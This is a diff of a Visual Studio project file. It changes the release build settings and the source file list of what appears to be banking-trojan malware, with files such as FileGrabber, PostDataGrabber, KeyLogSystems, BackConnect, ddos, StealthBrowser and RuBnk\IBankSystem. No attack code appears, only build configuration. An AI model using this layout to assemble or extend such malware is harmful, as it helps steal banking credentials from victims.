@@ -91,7 +91,7 @@
 		</Configuration>
 		<Configuration
 			Name="Release|Win32"
-			OutputDirectory="..\Bin\$(ConfigurationName)"
+			OutputDirectory="Bin\"
 			IntermediateDirectory="Objs\$(ConfigurationName)"
 			ConfigurationType="1"
 			CharacterSet="2"
@@ -114,7 +114,7 @@
 			/>
 			<Tool
 				Name="VCCLCompilerTool"
-				Optimization="0"
+				Optimization="3"
 				InlineFunctionExpansion="0"
 				EnableIntrinsicFunctions="false"
 				FavorSizeOrSpeed="0"
@@ -125,6 +125,7 @@
 				RuntimeLibrary="2"
 				BufferSecurityCheck="false"
 				EnableFunctionLevelLinking="true"
+				RuntimeTypeInfo="false"
 				UsePrecompiledHeader="0"
 				WarningLevel="3"
 				DebugInformationFormat="0"
@@ -142,9 +143,11 @@
 			/>
 			<Tool
 				Name="VCLinkerTool"
-				AdditionalDependencies="..\..\Source\Lib\exsup.lib libcmt.lib"
+				LinkLibraryDependencies="true"
+				AdditionalDependencies="..\..\Source\Lib\exsup.lib  libcmt.lib"
 				LinkIncremental="1"
 				GenerateManifest="false"
+				IgnoreAllDefaultLibraries="true"
 				GenerateDebugInformation="false"
 				GenerateMapFile="false"
 				SubSystem="2"
@@ -400,6 +403,10 @@
 				>
 			</File>
 			<File
+				RelativePath="..\..\source\Core\BotSocket.h"
+				>
+			</File>
+			<File
 				RelativePath="..\..\Source\Core\BotUtils.h"
 				>
 			</File>
@@ -448,6 +455,10 @@
 				>
 			</File>
 			<File
+				RelativePath="..\..\source\Common\DbgRpt.h"
+				>
+			</File>
+			<File
 				RelativePath="..\..\Source\Core\DbgTemplates.h"
 				>
 			</File>
@@ -465,6 +476,10 @@
 			</File>
 			<File
 				RelativePath="..\..\Source\Common\FgrFilters.h"
+				>
+			</File>
+			<File
+				RelativePath="..\..\source\Common\FileGrabber.h"
 				>
 			</File>
 			<File
@@ -576,11 +591,19 @@
 				>
 			</File>
 			<File
+				RelativePath="..\..\source\Common\Pipes.h"
+				>
+			</File>
+			<File
 				RelativePath="..\..\Source\Core\Plugins.h"
 				>
 			</File>
 			<File
 				RelativePath="..\..\Source\Misc\Poker.h"
+				>
+			</File>
+			<File
+				RelativePath="..\..\source\Common\PostDataGrabber.h"
 				>
 			</File>
 			<File
@@ -676,10 +699,6 @@
 				>
 			</File>
 			<File
-				RelativePath="..\..\Source\Common\AvBlock.cpp"
-				>
-			</File>
-			<File
 				RelativePath="..\..\Source\Misc\BackConnect.cpp"
 				>
 			</File>
@@ -717,6 +736,10 @@
 			</File>
 			<File
 				RelativePath="..\..\Source\Core\BotHTTPDebug.cpp"
+				>
+			</File>
+			<File
+				RelativePath="..\..\source\Core\BotSocket.cpp"
 				>
 			</File>
 			<File
@@ -764,6 +787,10 @@
 				>
 			</File>
 			<File
+				RelativePath="..\..\source\Common\DbgRpt.cpp"
+				>
+			</File>
+			<File
 				RelativePath="..\..\Source\Misc\ddos.cpp"
 				>
 			</File>
@@ -777,6 +804,10 @@
 			</File>
 			<File
 				RelativePath="..\..\Source\Common\FgrFilters.cpp"
+				>
+			</File>
+			<File
+				RelativePath="..\..\source\Common\FileGrabber.cpp"
 				>
 			</File>
 			<File
@@ -804,10 +835,6 @@
 				>
 			</File>
 			<File
-				RelativePath="..\..\Source\RuBnk\Ibank.cpp"
-				>
-			</File>
-			<File
 				RelativePath="..\..\Source\RuBnk\IBankSystem.cpp"
 				>
 			</File>
@@ -817,10 +844,6 @@
 			</File>
 			<File
 				RelativePath="..\..\Source\Misc\imbicili.cpp"
-				>
-			</File>
-			<File
-				RelativePath="..\..\Source\RuBnk\Inist.cpp"
 				>
 			</File>
 			<File
@@ -840,10 +863,6 @@
 				>
 			</File>
 			<File
-				RelativePath="..\..\Source\Misc\KeyLogger.cpp"
-				>
-			</File>
-			<File
 				RelativePath="..\..\Source\Misc\KeyLogSystems.cpp"
 				>
 			</File>
@@ -856,7 +875,7 @@
 				>
 			</File>
 			<File
-				RelativePath="..\Main.cpp"
+				RelativePath=".\Main.cpp"
 				>
 			</File>
 			<File
@@ -876,11 +895,15 @@
 				>
 			</File>
 			<File
+				RelativePath="..\..\source\Common\Pipes.cpp"
+				>
+			</File>
+			<File
 				RelativePath="..\..\Source\Core\Plugins.cpp"
 				>
 			</File>
 			<File
-				RelativePath="..\..\Source\Misc\Poker.cpp"
+				RelativePath="..\..\source\Common\PostDataGrabber.cpp"
 				>
 			</File>
 			<File
@@ -904,10 +927,6 @@
 				>
 			</File>
 			<File
-				RelativePath="..\..\Source\Misc\Screens.cpp"
-				>
-			</File>
-			<File
 				RelativePath="..\..\Source\Common\ScreenShots.cpp"
 				>
 			</File>
@@ -921,6 +940,14 @@
 			</File>
 			<File
 				RelativePath="..\..\Source\Misc\StealthBrowser.cpp"
+				>
+			</File>
+			<File
+				RelativePath="..\..\source\Core\StrConsts.cpp"
+				>
+			</File>
+			<File
+				RelativePath="..\..\source\Core\StrConsts.h"
 				>
 			</File>
 			<File
